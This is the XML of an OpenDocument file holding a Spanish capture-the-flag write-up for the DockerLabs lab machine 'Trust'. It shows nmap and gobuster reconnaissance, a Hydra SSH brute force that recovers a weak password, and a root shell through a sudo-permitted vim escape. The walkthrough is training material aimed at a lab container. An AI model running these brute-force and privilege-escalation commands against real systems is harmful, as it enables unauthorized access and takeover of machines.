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text>
      <text:h text:outline-level="1" text:style-name="Title">WRITEUP — DockerLabs</text:h>
      <text:p text:style-name="Subtitle">Máquina: Trust  |  Nivel: Muy Fácil  |  07/03/2026</text:p>
      <text:p text:style-name="Normal"/>
      <table:table>
        <table:table-column/>
        <table:table-column/>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Plataforma</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">DockerLabs (dockerlabs.es)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Máquina</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Trust</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Dificultad</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Muy Fácil</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">IP Objetivo</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">172.18.0.2</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Sistema Operativo</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Linux (Debian)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Puertos abiertos</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">22 (SSH), 80 (HTTP)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Resumen</text:p>
      <text:p text:style-name="Normal">La máquina Trust es una máquina Linux de nivel Muy Fácil en DockerLabs. El objetivo es obtener acceso root mediante reconocimiento de puertos, fuerza bruta SSH y escalada de privilegios a través de vim con permisos sudo mal configurados.</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Paso 1 — Reconocimiento con Nmap</text:p>
      <text:p text:style-name="Normal">Escaneamos la máquina para descubrir puertos y servicios activos:</text:p>
      <text:p text:style-name="Code">nmap -sV 172.18.0.2</text:p>
      <text:p text:style-name="Normal">Resultado:</text:p>
      <text:p text:style-name="Code">PORT   STATE SERVICE VERSION</text:p>
      <text:p text:style-name="Code">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2</text:p>
      <text:p text:style-name="Code">80/tcp open  http    Apache httpd 2.4.57 ((Debian))</text:p>
      <text:p text:style-name="Normal">Encontramos dos puertos abiertos:</text:p>
      <text:p text:style-name="Bullet">•  Puerto 22 — SSH: acceso remoto a la máquina</text:p>
      <text:p text:style-name="Bullet">•  Puerto 80 — HTTP: servidor web Apache</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Paso 2 — Enumeración Web con Gobuster</text:p>
      <text:p text:style-name="Normal">Buscamos directorios ocultos en el servidor web:</text:p>
      <text:p text:style-name="Code">gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/big.txt</text:p>
      <text:p text:style-name="Normal">Resultado: Solo la página por defecto de Apache. No encontramos nada útil por esta vía.</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Paso 3 — Fuerza Bruta SSH con Hydra</text:p>
      <text:p text:style-name="Normal">Atacamos el SSH con el usuario 'mario' (relacionado con el nombre de la máquina) y rockyou.txt:</text:p>
      <text:p text:style-name="Code">hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 ssh -t 16</text:p>
      <text:p text:style-name="Normal">Credenciales encontradas:</text:p>
      <text:p text:style-name="Code">[22][ssh] host: 172.18.0.2   login: mario   password: chocolate</text:p>
      <text:p text:style-name="Bullet">•  Usuario: mario</text:p>
      <text:p text:style-name="Bullet">•  Contraseña: chocolate</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Paso 4 — Acceso Inicial por SSH</text:p>
      <text:p text:style-name="Normal">Con las credenciales obtenidas nos conectamos como mario:</text:p>
      <text:p text:style-name="Code">ssh mario@172.18.0.2</text:p>
      <text:p text:style-name="Normal">Acceso conseguido como usuario no privilegiado.</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Paso 5 — Escalada de Privilegios</text:p>
      <text:p text:style-name="H2">◆ Enumeración de permisos sudo</text:p>
      <text:p text:style-name="Normal">Comprobamos qué comandos puede ejecutar mario como root:</text:p>
      <text:p text:style-name="Code">sudo -l</text:p>
      <text:p text:style-name="Code">(ALL) /usr/bin/vim</text:p>
      <text:p text:style-name="Normal">Mario puede ejecutar vim como root sin contraseña. Esto es una misconfiguration clásica.</text:p>
      <text:p text:style-name="H2">◆ Explotación con GTFOBins</text:p>
      <text:p text:style-name="Normal">Vim permite ejecutar comandos del sistema desde dentro del editor. Al ejecutarlo como root obtenemos una shell root:</text:p>
      <text:p text:style-name="Code">sudo vim -c ':!/bin/bash'</text:p>
      <text:p text:style-name="Code">root@e1ec9b0363b1:/home/mario# whoami</text:p>
      <text:p text:style-name="Code">root</text:p>
      <text:p text:style-name="Normal">¡Máquina comprometida!</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Conclusión</text:p>
      <text:p text:style-name="Normal">Vulnerabilidades explotadas:</text:p>
      <text:p text:style-name="Bullet">•  Contraseña débil en SSH (chocolate) — detectable con fuerza bruta</text:p>
      <text:p text:style-name="Bullet">•  Permiso sudo mal configurado en vim — permite escapar a shell como root</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="Normal">Lecciones aprendidas:</text:p>
      <text:p text:style-name="Bullet">•  Siempre hacer reconocimiento completo antes de atacar</text:p>
      <text:p text:style-name="Bullet">•  Usuarios relacionados con el nombre de la máquina suelen ser válidos en CTFs</text:p>
      <text:p text:style-name="Bullet">•  sudo -l es uno de los primeros comandos tras obtener acceso</text:p>
      <text:p text:style-name="Bullet">•  GTFOBins es un recurso esencial para escalada de privilegios</text:p>
      <text:p text:style-name="Normal"/>
      <text:p text:style-name="H1">▶  Herramientas Utilizadas</text:p>
      <table:table>
        <table:table-column/>
        <table:table-column/>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Nmap</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Reconocimiento y escaneo de puertos</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Gobuster</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Enumeración de directorios web</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">Hydra</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Fuerza bruta de credenciales SSH</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="HeaderCell">
            <text:p><text:span text:style-name="HeaderText">GTFOBins</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="NormalCell">
            <text:p><text:span text:style-name="NormalText">Escalada de privilegios con vim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Title" style:family="paragraph" style:display-name="Title">
      <style:text-properties fo:font-size="24pt" fo:font-weight="bold" fo:color="#1F4E79"/>
      <style:paragraph-properties fo:text-align="center" fo:margin-bottom="0.3cm"/>
    </style:style>
    <style:style style:name="Subtitle" style:family="paragraph" style:display-name="Subtitle">
      <style:text-properties fo:font-size="16pt" fo:color="#2E75B6"/>
      <style:paragraph-properties fo:text-align="center" fo:margin-bottom="0.5cm"/>
    </style:style>
    <style:style style:name="H1" style:family="paragraph" style:display-name="H1">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" fo:color="#1F4E79"/>
      <style:paragraph-properties fo:margin-top="0.4cm" fo:margin-bottom="0.2cm"/>
    </style:style>
    <style:style style:name="H2" style:family="paragraph" style:display-name="H2">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" fo:color="#2E75B6"/>
      <style:paragraph-properties fo:margin-top="0.3cm" fo:margin-bottom="0.15cm"/>
    </style:style>
    <style:style style:name="Normal" style:family="paragraph" style:display-name="Normal">
      <style:text-properties fo:font-size="11pt"/>
      <style:paragraph-properties fo:margin-bottom="0.15cm"/>
    </style:style>
    <style:style style:name="Code" style:family="paragraph" style:display-name="Code">
      <style:text-properties fo:font-size="10pt" fo:font-family="Courier New" fo:color="#00AA00"/>
      <style:paragraph-properties fo:background-color="#1E1E1E" fo:margin-left="0.5cm" fo:margin-top="0.1cm" fo:margin-bottom="0.1cm"/>
    </style:style>
    <style:style style:name="Bullet" style:family="paragraph" style:display-name="Bullet">
      <style:text-properties fo:font-size="11pt"/>
      <style:paragraph-properties fo:margin-left="0.8cm" fo:margin-bottom="0.1cm"/>
    </style:style>
    <style:style style:name="HeaderCell" style:family="table-cell" style:display-name="HeaderCell">
      <style:table-cell-properties fo:background-color="#2E75B6" fo:padding="0.15cm"/>
    </style:style>
    <style:style style:name="NormalCell" style:family="table-cell" style:display-name="NormalCell">
      <style:table-cell-properties fo:background-color="#F5F5F5" fo:padding="0.15cm"/>
    </style:style>
    <style:style style:name="HeaderText" style:family="text" style:display-name="HeaderText">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" fo:color="#FFFFFF"/>
    </style:style>
    <style:style style:name="NormalText" style:family="text" style:display-name="NormalText">
      <style:text-properties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